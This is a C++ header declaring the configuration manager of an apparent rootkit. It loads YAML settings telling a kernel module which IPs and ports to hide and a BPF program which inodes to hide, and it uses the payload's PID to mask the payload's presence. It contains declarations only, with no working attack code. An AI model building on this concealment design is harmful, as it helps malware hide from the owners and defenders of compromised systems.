#ifndef ROOTKIT_CONFIG_MANGER_H
#define ROOTKIT_CONFIG_MANGER_H

#include <cstdint>
#include <optional>
#include <vector>
#include <string>
#include <yaml-cpp/yaml.h>

#define CONFIG_PATH "rt_conf.yaml"

namespace rootkit {

struct KernelModuleConfig {
    std::string module_path;
    std::string module_name;
    std::vector<std::pair<std::string, uint16_t>> ips_and_ports = {
    };
};

struct RootkitBpfConfig {
    std::vector<uint64_t> inodes;
};

class ConfigManager {
private:
    bool is_config_ready;
    std::string config_path;
    pid_t payload_pid;
    KernelModuleConfig kConf;
    RootkitBpfConfig bpfConf;

public:
    /**
    * @brief Constructor, uses default config path
    * @param payload_pid Pid of the payload, used to configure masking its presence
    */
    ConfigManager(const pid_t payload_pid);

    /**
    * @brief Constructor
    * @param config_path Path to the config file
    * @param payload_pid Pid of the payload, used to configure masking its presence
    */
    ConfigManager(const std::string& config_path, const pid_t payload_pid);

    /**
    * @brief Reads config, and setup internal state
    * @return Returns true if reading was correct, and false if error happened
    */
    bool read();

    /**
    * @brief Returns config for kernel module. Set of ips and ports to hide.
    * @return Return nullopt if reading of config file wasn't successful,
    * otherwise return config
    */
    std::optional<KernelModuleConfig> get_kernel_module_config();

    /**
    * @brief Returns config for bpf progrm, inodes to hide.
    * @return Return nullopt if reading of config file wasn't successful,
    * otherwise return config
    */
    std::optional<RootkitBpfConfig> get_bpf_config();
};

}

#endif
